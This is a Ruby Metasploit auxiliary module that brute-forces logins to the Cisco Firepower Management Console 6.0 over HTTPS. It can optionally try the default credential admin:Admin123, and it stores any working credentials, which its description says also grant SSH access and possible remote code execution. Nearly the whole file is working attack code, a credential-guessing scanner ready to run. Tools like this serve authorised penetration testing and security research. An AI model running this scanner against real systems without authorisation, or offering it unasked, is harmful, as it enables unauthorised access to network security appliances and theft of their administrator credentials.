##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/cisco_firepower'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Cisco Firepower Management Console 6.0 Login',
      'Description' => %q{
        This module attempts to authenticate to a Cisco Firepower Management console via HTTPS.
        The credentials are also used for SSH, which could allow remote code execution.
      },
      'Author'      => [ 'sinn3r' ],
      'License'     => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'RPORT'      => 443,
          'SSL'        => true,
          'SSLVersion' => 'Auto'
        }
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to Cisco Firepower Management console', '/']),
        OptBool.new('TRYDEFAULT', [false, 'Try the default credential admin:Admin123', false])
      ])
  end


  def scanner(ip)
    @scanner ||= lambda {
      cred_collection = build_credential_collection(
        username: datastore['USERNAME'],
        password: datastore['PASSWORD']
      )

      if datastore['TRYDEFAULT']
        print_status("Default credential admin:Admin123 added to the credential queue for testing.")
        cred_collection.add_public('admin')
        cred_collection.add_private('Admin123')
      end

      return Metasploit::Framework::LoginScanner::CiscoFirepower.new(
        configure_http_login_scanner(
          host: ip,
          port: datastore['RPORT'],
          cred_details:       cred_collection,
          stop_on_success:    datastore['STOP_ON_SUCCESS'],
          bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
          connection_timeout: 5,
          http_username:      datastore['HttpUsername'],
          http_password:      datastore['HttpPassword'],
          uri:                target_uri.path
        ))
    }.call
  end


  def report_good_cred(ip, port, result)
    service_data = {
      address: ip,
      port: port,
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
      username: result.credential.public,
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      last_attempted_at: DateTime.now,
      status: result.status,
      proof: result.proof
    }.merge(service_data)

    create_credential_login(login_data)
  end


  def report_bad_cred(ip, rport, result)
    invalidate_login(
      address: ip,
      port: rport,
      protocol: 'tcp',
      public: result.credential.public,
      private: result.credential.private,
      realm_key: result.credential.realm_key,
      realm_value: result.credential.realm,
      status: result.status,
      proof: result.proof
    )
  end

  def bruteforce(ip)
    scanner(ip).scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute(:level => :good, :ip => ip, :msg => "Success: '#{result.credential}'")
        report_good_cred(ip, rport, result)
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        vprint_brute(:level => :verror, :ip => ip, :msg => result.proof)
        report_bad_cred(ip, rport, result)
      when Metasploit::Model::Login::Status::INCORRECT
        vprint_brute(:level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'")
        report_bad_cred(ip, rport, result)
      end
    end
  end

  def run_host(ip)
    unless scanner(ip).check_setup
      print_brute(:level => :error, :ip => ip, :msg => 'Target is not Cisco Firepower Management console.')
      return
    end

    bruteforce(ip)
  end
end
